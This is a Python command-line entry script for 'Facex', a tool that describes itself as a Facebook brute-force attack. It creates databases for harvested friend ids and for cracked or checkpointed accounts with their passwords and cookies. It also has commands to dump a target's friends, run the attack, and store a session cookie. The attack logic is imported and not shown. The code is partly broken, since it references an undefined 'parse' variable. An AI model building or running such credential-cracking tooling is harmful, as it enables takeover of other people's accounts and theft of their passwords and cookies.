#!/usr/bin/env python3
import argparse, os, sys, sqlite3
from . import Facebook, token
DB_DIR = os.path.expanduser('~/.facex')
#DB_NAME = os.path.join(DB_DIR, 'database.db')
DB_NAME = '/sdcard/database.db'

if not os.path.exists(DB_DIR):
    os.makedirs(DB_DIR)
    print(DB_DIR)

def main():
    with sqlite3.connect(DB_NAME) as db:
        cursor = db.cursor()
        cursor.execute('CREATE TABLE IF NOT EXISTS cache (id TEXT UNIQUE)')
        cursor.execute('CREATE TABLE IF NOT EXISTS checkpoint (id TEXT UNIQUE NOT NULL, password TEXT, cookie TEXT, useragents TEXT)')
        cursor.execute('CREATE TABLE IF NOT EXISTS success (id TEXT UNIQUE NOT NULL, password TEXT, cookie TEXT, useragents TEXT)')
        cursor.execute('CREATE TABLE IF NOT EXISTS dump (id TEXT UNIQUE NOT NULL, name TEXT)')
        cursor.execute('CREATE TABLE IF NOT EXISTS user (cookie TEXT, token TEXT)')
        cursor.execute('CREATE TABLE IF NOT EXISTS useragents (ua TEXT)')
        db.commit()

    parser = argparse.ArgumentParser(prog='Facex', description='Facebook bruteforce attack using python cli.', epilog='Nyett')
    action = parser.add_subparsers(title='action', dest='action', required=True)

    dump = action.add_parser('dump')
    dump.add_argument('-t', '--target', help='Facebook id for get list friends.')

    run = action.add_parser('run')
    set = action.add_parser('set')
    set.add_argument('-c', '--cookie', help='Login.')
    set.add_argument('-ua', '--useragents', help='Add new useragents.')

    pars = parser.parse_args()
    print(pars)
    match pars.action:
        case 'set':
            if pars.cookie:
                tokens = token(cookie=parse.cookie)
                with sqlite3.connect(DB_NAME) as db:
                    c = db.cursor()
                    c.execute('DELETE FROM user')
                    c.execute('INSERT INTO user (cookie, token) VALUES (?,?)', (parse.cookie, tokens))
                    db.commit()



if __name__ == "__main__":
    main()
